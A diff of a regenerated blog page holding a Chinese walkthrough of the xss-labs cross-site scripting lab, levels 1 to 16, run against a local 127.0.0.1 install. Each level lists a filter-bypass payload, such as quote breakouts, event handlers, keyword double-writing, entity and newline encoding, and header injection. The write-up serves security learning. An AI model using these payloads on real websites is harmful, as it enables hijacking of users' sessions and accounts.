@@ -26,15 +26,11 @@
 <meta property="og:site_name" content="Mul1n&#39;s Blog">
 <meta property="og:description" content="level1http:&#x2F;&#x2F;127.0.0.1&#x2F;xss-labs&#x2F;level1.php?name&#x3D;test 123&lt;h1 align&#x3D;center&gt;欢迎来到level1&lt;&#x2F;h1&gt; &lt;h2 align&#x3D;center&gt;欢迎用户test&lt;&#x2F;h2&gt;&lt;center&gt;&lt;img src&#x3D;[level1.png](view-source:http:&#x2F;">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://luomubing-lin.github.io/blog/images/Pasted_image_20251125181506.png">
-<meta property="og:image" content="https://luomubing-lin.github.io/blog/images/Pasted_image_20251125201332.png">
-<meta property="og:image" content="https://luomubing-lin.github.io/blog/images/Pasted_image_20251125204219.png">
 <meta property="article:published_time" content="2025-11-26T15:33:10.000Z">
-<meta property="article:modified_time" content="2025-12-16T10:39:42.869Z">
+<meta property="article:modified_time" content="2025-12-16T11:11:49.037Z">
 <meta property="article:author" content="mul1n">
 <meta property="article:tag" content="xss">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://luomubing-lin.github.io/blog/images/Pasted_image_20251125181506.png">
 
 
 <link rel="canonical" href="https://luomubing-lin.github.io/2025/11/26/xss-labs/">
@@ -138,7 +134,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#level1"><span class="nav-number">1.</span> <span class="nav-text">level1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level2"><span class="nav-number">2.</span> <span class="nav-text">level2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level3"><span class="nav-number">3.</span> <span class="nav-text">level3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level4"><span class="nav-number">4.</span> <span class="nav-text">level4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level5"><span class="nav-number">5.</span> <span class="nav-text">level5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level6"><span class="nav-number">6.</span> <span class="nav-text">level6</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level7"><span class="nav-number">7.</span> <span class="nav-text">level7</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level8"><span class="nav-number">8.</span> <span class="nav-text">level8</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level9"><span class="nav-number">9.</span> <span class="nav-text">level9</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level10"><span class="nav-number">10.</span> <span class="nav-text">level10</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level11"><span class="nav-number">11.</span> <span class="nav-text">level11</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level12"><span class="nav-number">12.</span> <span class="nav-text">level12</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level13"><span class="nav-number">13.</span> <span class="nav-text">level13</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level15"><span class="nav-number">14.</span> <span class="nav-text">level15</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level16"><span class="nav-number">15.</span> <span class="nav-text">level16</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#level1"><span class="nav-number">1.</span> <span class="nav-text">level1</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -227,7 +223,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2025-12-16 18:39:42" itemprop="dateModified" datetime="2025-12-16T18:39:42+08:00">2025-12-16</time>
+      <time title="Modified: 2025-12-16 19:11:49" itemprop="dateModified" datetime="2025-12-16T19:11:49+08:00">2025-12-16</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -251,39 +247,111 @@
     <div class="post-body" itemprop="articleBody"><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p><a target="_blank" rel="noopener" href="http://127.0.0.1/xss-labs/level1.php?name=test">http://127.0.0.1/xss-labs/level1.php?name=test</a></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 align=center&gt;欢迎来到level1&lt;/h1&gt; </span><br><span class="line">&lt;h2 align=center&gt;欢迎用户test&lt;/h2&gt;&lt;center&gt;&lt;img src=[level1.png](view-source:http://127.0.0.1/xss-labs/level1.png)&gt;&lt;/center&gt; </span><br><span class="line">&lt;h3 align=center&gt;payload的长度:4&lt;/h3&gt;&lt;/body&gt;</span><br></pre></td></tr></table></figure>
 <p>test直接被带入html标签中，传入<code>&lt;h1&gt;1&lt;/h1&gt;</code> 测试成功显示标题1<br><code>payload: ?name=&lt;script&gt;alert(0);&lt;/script&gt;</code></p>
-<span id="more"></span>
+<pre><code>
+### level2
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=[level2.php](view-source:http://127.0.0.1/xss-labs/level2.php) method=GET&gt; </span><br><span class="line">&lt;input name=keyword value=&quot;&lt;script&gt;alert(1);&lt;/script&gt;&quot;&gt; </span><br><span class="line">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span><br></pre></td></tr></table></figure>
+传入`&lt;script&gt;alert(1);&lt;/script&gt;`后发现被带入到input标签，并且没有转义
+所以构造
+`payload:&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;`
 
-<h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=[level2.php](view-source:http://127.0.0.1/xss-labs/level2.php) method=GET&gt; </span><br><span class="line">&lt;input name=keyword value=&quot;&lt;script&gt;alert(1);&lt;/script&gt;&quot;&gt; </span><br><span class="line">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span><br></pre></td></tr></table></figure>
-<p>传入<code>&lt;script&gt;alert(1);&lt;/script&gt;</code>后发现被带入到input标签，并且没有转义<br>所以构造<br><code>payload:&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;</code></p>
-<h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 align=center&gt;欢迎来到level3&lt;/h1&gt; </span><br><span class="line">&lt;h2 align=center&gt;没有找到和1相关的结果.&lt;/h2&gt;&lt;center&gt; </span><br><span class="line">&lt;form action=[level3.php](view-source:http://127.0.0.1/xss-labs/level3.php) method=GET&gt; </span><br><span class="line">&lt;input name=keyword value=&#x27;1&#x27;&gt; &lt;input type=submit name=submit value=搜索 /&gt;</span><br></pre></td></tr></table></figure>
-<p>发现闭合为单引号<br>尝试：<code>&#39;&gt;&lt;script&gt;alert(1);&lt;/script&gt;</code><br><code>&lt;input name=keyword value=&#39;&#39;&amp;gt;&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;&#39;&gt;</code><br>发现被&lt;,&gt;被转义<br>于是使用触发器onfocus,onmouseover,onclick<br>构造<code>payload: &#39; onfocus=javascript:alert(1) &#39;</code></p>
-<h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p>与level3类似，”改为’即可</p>
-<h3 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h3><p>查看源码发现是使用双引号闭合，尝试上传：<code>&quot;&gt;&lt;script&gt;alert(0);&lt;/script&gt;</code></p>
+### level3
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 align=center&gt;欢迎来到level3&lt;/h1&gt; </span><br><span class="line">&lt;h2 align=center&gt;没有找到和1相关的结果.&lt;/h2&gt;&lt;center&gt; </span><br><span class="line">&lt;form action=[level3.php](view-source:http://127.0.0.1/xss-labs/level3.php) method=GET&gt; </span><br><span class="line">&lt;input name=keyword value=&#x27;1&#x27;&gt; &lt;input type=submit name=submit value=搜索 /&gt;</span><br></pre></td></tr></table></figure>
+发现闭合为单引号
+尝试：`&#39;&gt;&lt;script&gt;alert(1);&lt;/script&gt;`
+`&lt;input name=keyword value=&#39;&#39;&amp;gt;&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;&#39;&gt;`
+发现被&lt;,&gt;被转义
+于是使用触发器onfocus,onmouseover,onclick
+构造`payload: &#39; onfocus=javascript:alert(1) &#39;`
+
+### level4
+与level3类似，&quot;改为&#39;即可
+### level5
+查看源码发现是使用双引号闭合，尝试上传：`&quot;&gt;&lt;script&gt;alert(0);&lt;/script&gt;`
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 align=center&gt;欢迎来到level5&lt;/h1&gt; </span><br><span class="line">&lt;h2 align=center&gt;没有找到和&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt; </span><br><span class="line">&lt;form action=[level5.php](view-source:http://127.0.0.1/xss-labs/level5.php) method=GET&gt; </span><br><span class="line">&lt;input name=keyword value=&quot;&quot;&gt;&lt;scr_ipt&gt;alert(1);&lt;/script&gt;&quot;&gt; </span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br></pre></td></tr></table></figure>
-<p>发现传入的<code>&lt;script&gt;</code>被转换为了<code>&lt;scr_ipt&gt;</code>导致标签失去作用<br>传on也同样出现被转换为o_n的情况<br>也就是上述的两种办法都不行<br>&#x3D;&#x3D;但是可以利用 JavaScript 的 URI&#x3D;&#x3D;<br><code>payload: ?keyword=&quot;&gt; &lt;a href=javascript:alert(1)&gt;hack&lt;/a&gt;</code><br><img src="/blog/images/Pasted_image_20251125181506.png"><br>点击hack即可</p>
-<h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><p>这题的href会被替换成hr_ef<br>但是经过测试发现，这道题对敏感词区分大小写的过滤，所以使用<br>payload:</p>
+发现传入的`&lt;script&gt;`被转换为了`&lt;scr_ipt&gt;`导致标签失去作用
+传on也同样出现被转换为o_n的情况
+也就是上述的两种办法都不行
+==但是可以利用 JavaScript 的 URI==
+`payload: ?keyword=&quot;&gt; &lt;a href=javascript:alert(1)&gt;hack&lt;/a&gt;`
+![](/images/Pasted_image_20251125181506.png)
+点击hack即可
+
+### level6
+这题的href会被替换成hr_ef
+但是经过测试发现，这道题对敏感词区分大小写的过滤，所以使用
+payload:
+
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- &quot;&gt; &lt;a hREF=javascript:alert(1)&gt;hack&lt;/a&gt;</span><br><span class="line">- &quot;&gt;&lt;SCRipt&gt;alert(1);&lt;/script&gt;</span><br><span class="line">- &quot; oNclick=javascript:alert(1) &quot;</span><br></pre></td></tr></table></figure>
-<h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><p>尝试过后，会发现这关里 <code>script</code> 这个字符串会被过滤，即替换为空字符串。<br>然而，将所有搜索到的这个字符串替换为空后，对于拼接得到的新字符串，没有再一次进行检测。这是一个非常常见的安全问题。我们只要「双写」关键词即可。例如，<code>scriscriptpt</code> 被扫描替换一次后，会变成 <code>script</code>。<br><code>payload: &quot;&gt;&lt;scrscriptipt&gt;alert(1);&lt;/scrscriptipt&gt;</code></p>
-<h3 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h3><p>这一关开始出现两个可以进行xss攻击的地方</p>
+### level7
+尝试过后，会发现这关里 `script` 这个字符串会被过滤，即替换为空字符串。
+然而，将所有搜索到的这个字符串替换为空后，对于拼接得到的新字符串，没有再一次进行检测。这是一个非常常见的安全问题。我们只要「双写」关键词即可。例如，`scriscriptpt` 被扫描替换一次后，会变成 `script`。
+`payload: &quot;&gt;&lt;scrscriptipt&gt;alert(1);&lt;/scrscriptipt&gt;`
+### level8
+这一关开始出现两个可以进行xss攻击的地方
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword value=&quot;javascript:alert(0)&quot;&gt; </span><br><span class="line">&lt;input type=submit name=submit value=添加友情链接 /&gt; </span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;[javascr_ipt:alert(0)](view-source:http://127.0.0.1/xss-labs/javascr_ipt:alert\(0\))&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=[level8.jpg](view-source:http://127.0.0.1/xss-labs/level8.jpg)&gt;&lt;/center&gt;</span><br></pre></td></tr></table></figure>
-<p>在input标签处，经过测试，会对”,&lt;,&gt;进行转义，导致无法闭合input标签<br>在&lt;a href标签处，会对script，on进行替换<br>使用html实体编码绕过<br><code>payload：java&amp;#x0073;cript:alert(1)</code><br>编码格式：</p>
-<ul>
-<li>&amp;# + 字符的ascii编码的十进制</li>
-<li>或&amp;#x+字符的ascii编码的十六进制</li>
-</ul>
-<h3 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h3><p>上传上一题的payload提示连接不合法，如果上传<a target="_blank" rel="noopener" href="http://test,则是一个合法的链接/">http://test，则是一个合法的链接</a><br>经过尝试可以发现，后端只检测传入的链接字符串是否包含 <code>http://</code>，并不要求其在开头。非常弱智的检测方式（而且甚至没有考虑 https）。那么我们只要在注入的 js 代码里加上注释，里面写上 <code>http://</code> 就行了。<br><code>payload: java&amp;#x0073;cript:alert(1)//http://</code></p>
-<h3 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h3><p><a target="_blank" rel="noopener" href="http://127.0.0.1/xss-labs/level10.php?keyword=well%20done">http://127.0.0.1/xss-labs/level10.php?keyword=well%20done</a>!</p>
+在input标签处，经过测试，会对&quot;,&lt;,&gt;进行转义，导致无法闭合input标签
+在&lt;a href标签处，会对script，on进行替换
+使用html实体编码绕过
+`payload：java&amp;#x0073;cript:alert(1)`
+编码格式：
+- &amp;# + 字符的ascii编码的十进制
+- 或&amp;#x+字符的ascii编码的十六进制
+### level9
+上传上一题的payload提示连接不合法，如果上传http://test，则是一个合法的链接
+经过尝试可以发现，后端只检测传入的链接字符串是否包含 `http://`，并不要求其在开头。非常弱智的检测方式（而且甚至没有考虑 https）。那么我们只要在注入的 js 代码里加上注释，里面写上 `http://` 就行了。
+`payload: java&amp;#x0073;cript:alert(1)//http://`
+### level10
+http://127.0.0.1/xss-labs/level10.php?keyword=well%20done!
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 align=center&gt;欢迎来到level10&lt;/h1&gt; </span><br><span class="line">&lt;h2 align=center&gt;没有找到和well done!相关的结果.&lt;/h2&gt;&lt;center&gt; &lt;form id=search&gt; </span><br><span class="line">&lt;input name=&quot;t_link&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt; </span><br><span class="line">&lt;input name=&quot;t_history&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt; </span><br><span class="line">&lt;input name=&quot;t_sort&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
-<p>可以发现有隐藏的可上传参数<br>构造payload:<br><code>?keyword=well done!&amp;t_link=1&amp;t_history=2&amp;t_sort=3</code></p>
+可以发现有隐藏的可上传参数
+构造payload:
+`?keyword=well done!&amp;t_link=1&amp;t_history=2&amp;t_sort=3`
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;t_link&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt; </span><br><span class="line">&lt;input name=&quot;t_history&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt; </span><br><span class="line">&lt;input name=&quot;t_sort&quot; value=&quot;3&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
-<p>发现t_sort这个参数可以进行攻击<br>经过尝试，会将&lt;&gt;替换为空字符，于是使用onmouseover进行攻击<br>构造<br><code>payload:?keyword=well done!&amp;t_link=1&amp;t_history=2&amp;t_sort=&quot; onmouseover=javascript:alert(0) &quot;</code><br>但是由于type 仍然是hidden，不可见，所以页面没有反应<br>payload:<br><code>?keyword=well done!&amp;t_link=1&amp;t_history=2&amp;t_sort=&quot; onmouseover=javascript:alert(0) type &quot;</code><br>手动添加一个type覆盖掉后面，就出现了一个框，就成功了</p>
-<h3 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h3><p>查看页面源码发现有一个input标签名为t_ref，并且字段为level10最后提交的url，那么这就是一个referer的注入<br>使用hackbar：<br><img src="/blog/images/Pasted_image_20251125201332.png"><br>即可过关</p>
-<h3 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h3><p><code>&lt;input name=&quot;t_ua&quot; value=&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0&quot; type=&quot;hidden&quot;&gt;</code><br>浏览器标识user-agent，可以通过burpsuite抓包修改<br>修改为：” onmouseover&#x3D;javascript:alert(0) type “发包即可成功</p>
-<h3 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;t_link&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt; </span><br><span class="line">&lt;input name=&quot;t_history&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt; </span><br><span class="line">&lt;input name=&quot;t_sort&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt; </span><br><span class="line">&lt;input name=&quot;t_cook&quot; value=&quot;call me maybe?&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
-<p>抓包查看<br><img src="/blog/images/Pasted_image_20251125204219.png"><br>发现t_cook是cookie<br>修改后发包<br>也是一样的payload</p>
-<h3 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h3><p>查看页面源码发现了一个新属性，<code>ng-include</code>，ng-include指令一般用于包含外部HTML文件，ng-include属性的值可以是一个表达式，返回一个文件名，但是默认情况下，包含的文件需要包含在同一域名下，也就是要调用同一域名下的其他网页。<br>传参：?src&#x3D;1<br>发现出现在了ng-include的值的位置，<br>传参src&#x3D;’ level1.php ‘<br>网页包含了level1的画面<br>构造payload:<br><code>?src=&#39; level1.php?name=&lt;img src=1 onerror=javascript:alert(1)&gt; &#39;</code><br>成功</p>
-<h3 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h3><p>传参<code>&lt;script&gt;alert(0);&lt;/script&gt;</code>，发现&#x2F;和script被替换为了空格<br><code>&lt;center&gt;&lt;&amp;nbsp;&gt;alert(0);&lt;&amp;nbsp;&amp;nbsp;&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=[level16.png](view-source:http://localhost/xss-labs/level16.png)&gt;&lt;/center&gt;</code><br>但是&lt;&gt;没有，尝试&lt;a 标签<br><code>&lt;a href=&quot;javascript:alert(0)&quot;&gt;111</code><br>发现空格也被替换<br>使用%0a和%0d替换空格<br>payload: </p>
+发现t_sort这个参数可以进行攻击
+经过尝试，会将&lt;&gt;替换为空字符，于是使用onmouseover进行攻击
+构造
+`payload:?keyword=well done!&amp;t_link=1&amp;t_history=2&amp;t_sort=&quot; onmouseover=javascript:alert(0) &quot;`
+但是由于type 仍然是hidden，不可见，所以页面没有反应
+payload:
+`?keyword=well done!&amp;t_link=1&amp;t_history=2&amp;t_sort=&quot; onmouseover=javascript:alert(0) type &quot;`
+手动添加一个type覆盖掉后面，就出现了一个框，就成功了
+### level11
+查看页面源码发现有一个input标签名为t_ref，并且字段为level10最后提交的url，那么这就是一个referer的注入
+使用hackbar：
+![](/images/Pasted_image_20251125201332.png)
+即可过关
+
+### level12
+`&lt;input name=&quot;t_ua&quot; value=&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0&quot; type=&quot;hidden&quot;&gt;`
+浏览器标识user-agent，可以通过burpsuite抓包修改
+修改为：&quot; onmouseover=javascript:alert(0) type &quot;发包即可成功
+### level13
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;t_link&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt; </span><br><span class="line">&lt;input name=&quot;t_history&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt; </span><br><span class="line">&lt;input name=&quot;t_sort&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt; </span><br><span class="line">&lt;input name=&quot;t_cook&quot; value=&quot;call me maybe?&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
+抓包查看
+![](/images/Pasted_image_20251125204219.png)
+发现t_cook是cookie
+修改后发包
+也是一样的payload
+
+### level15
+查看页面源码发现了一个新属性，`ng-include`，ng-include指令一般用于包含外部HTML文件，ng-include属性的值可以是一个表达式，返回一个文件名，但是默认情况下，包含的文件需要包含在同一域名下，也就是要调用同一域名下的其他网页。
+传参：?src=1
+发现出现在了ng-include的值的位置，
+传参src=&#39; level1.php &#39;
+网页包含了level1的画面
+构造payload:
+`?src=&#39; level1.php?name=&lt;img src=1 onerror=javascript:alert(1)&gt; &#39;`
+成功
+### level16
+传参`&lt;script&gt;alert(0);&lt;/script&gt;`，发现/和script被替换为了空格
+`&lt;center&gt;&lt;&amp;nbsp;&gt;alert(0);&lt;&amp;nbsp;&amp;nbsp;&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=[level16.png](view-source:http://localhost/xss-labs/level16.png)&gt;&lt;/center&gt;`
+但是&lt;&gt;没有，尝试&lt;a 标签
+`&lt;a href=&quot;javascript:alert(0)&quot;&gt;111`
+发现空格也被替换
+使用%0a和%0d替换空格
+payload: 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- &lt;a%0dhref=&quot;javas%0acript:alert(1)&quot;&gt;xss</span><br><span class="line">- &lt;a%0Donclick=alert(0)&gt;</span><br><span class="line">- &lt;a%0Donmouseover=alert(0)&gt;</span><br></pre></td></tr></table></figure>
+</code></pre>
 
     </div>
 
